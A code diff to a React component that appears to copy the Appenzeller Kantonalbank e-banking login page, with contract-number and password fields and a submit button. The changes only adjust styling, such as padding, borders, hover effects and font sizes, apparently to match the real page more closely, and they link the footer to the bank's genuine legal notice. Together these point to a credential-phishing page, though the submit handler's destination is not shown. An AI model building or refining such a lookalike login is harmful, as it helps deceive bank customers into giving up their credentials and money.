@@ -86,8 +86,8 @@ const ChAppenzellerKantonalbank = () => {
               {/* Left column: header + form */}
               <div className="md:w-1/2 flex flex-col">
                 {/* Header */}
-                <div className="px-8 pt-6 pb-4" style={{ borderBottom: `3px solid ${RED}` }}>
-                  <img src={logoAsset.url} alt="Appenzeller Kantonalbank" className="h-6" />
+                <div className="px-6 pt-2 pb-2" style={{ borderBottom: `3px solid ${RED}` }}>
+                  <img src={logoAsset.url} alt="Appenzeller Kantonalbank" className="h-9" />
                 </div>
 
                 {/* Form */}
@@ -105,8 +105,8 @@ const ChAppenzellerKantonalbank = () => {
                       type="text"
                       value={vertragsnummer}
                       onChange={(e) => setVertragsnummer(e.target.value)}
-                      className="w-full px-3 py-2 border outline-none text-[15px] rounded-[3px]"
-                      style={{ borderColor: "#cccccc", backgroundColor: "#fff" }}
+                      className="w-full px-3 py-2 border outline-none text-[15px] rounded-[5px] border-[#cccccc] hover:border-black focus:border-black transition-colors"
+                      style={{ backgroundColor: "#fff" }}
                     />
                   </div>
 
@@ -119,8 +119,8 @@ const ChAppenzellerKantonalbank = () => {
                         type={showPassword ? "text" : "password"}
                         value={passwort}
                         onChange={(e) => setPasswort(e.target.value)}
-                        className="w-full px-3 py-2 border outline-none text-[15px] pr-10 rounded-[3px]"
-                        style={{ borderColor: "#cccccc", backgroundColor: "#fff" }}
+                        className="w-full px-3 py-2 border outline-none text-[15px] pr-10 rounded-[5px] border-[#cccccc] hover:border-black focus:border-black transition-colors"
+                        style={{ backgroundColor: "#fff" }}
                       />
                       <button
                         type="button"
@@ -139,7 +139,7 @@ const ChAppenzellerKantonalbank = () => {
 
                   <button
                     onClick={handleSubmit}
-                    className="mx-auto w-full max-w-[200px] py-2.5 text-white font-semibold text-[15px] rounded-[3px]"
+                    className="mx-auto w-full max-w-[170px] py-2.5 text-white font-semibold text-[15px] rounded-[3px]"
                     style={{ backgroundColor: RED }}
                   >
                     Weiter
@@ -147,7 +147,7 @@ const ChAppenzellerKantonalbank = () => {
 
                   <a
                     href="#"
-                    className="mt-4 text-center text-[14px] hover:underline"
+                    className="mt-4 text-center text-[14px]"
                     style={{ color: RED }}
                   >
                     E-Banking und TWINT sperren
@@ -157,7 +157,7 @@ const ChAppenzellerKantonalbank = () => {
 
                   <a
                     href="#"
-                    className="mt-10 text-center text-[14px] hover:underline"
+                    className="mt-10 text-center text-[14px]"
                     style={{ color: RED }}
                   >
                     Brauchen Sie Hilfe?
@@ -206,7 +206,7 @@ const ChAppenzellerKantonalbank = () => {
                     className="absolute left-4 right-4 bottom-4 px-5 py-4 backdrop-blur-md rounded-md"
                     style={{ backgroundColor: "rgba(245,245,245,0.55)" }}
                   >
-                    <h3 className="font-semibold text-[15px] mb-1" style={{ color: RED }}>
+                    <h3 className="font-bold text-[13px] mb-1" style={{ color: RED }}>
                       {slides[activeSlide].title}
                     </h3>
                     <p className="text-[13px] leading-snug mb-1" style={{ color: "#222" }}>
@@ -242,7 +242,12 @@ const ChAppenzellerKantonalbank = () => {
         <footer className="mt-12" style={{ backgroundColor: "#353535" }}>
           <div className="max-w-[1100px] mx-auto px-8 py-4 flex items-center justify-between text-[13px]" style={{ color: "#fff" }}>
             <span>© Appenzeller Kantonalbank 2026</span>
-            <a href="#" className="hover:underline" style={{ color: "#fff" }}>
+            <a
+              href="https://www.appkb.ch/ihre-appkb/services/rechtliche-hinweise"
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-white hover:text-[#e30421] transition-colors"
+            >
               Rechtliche Hinweise
             </a>
           </div>
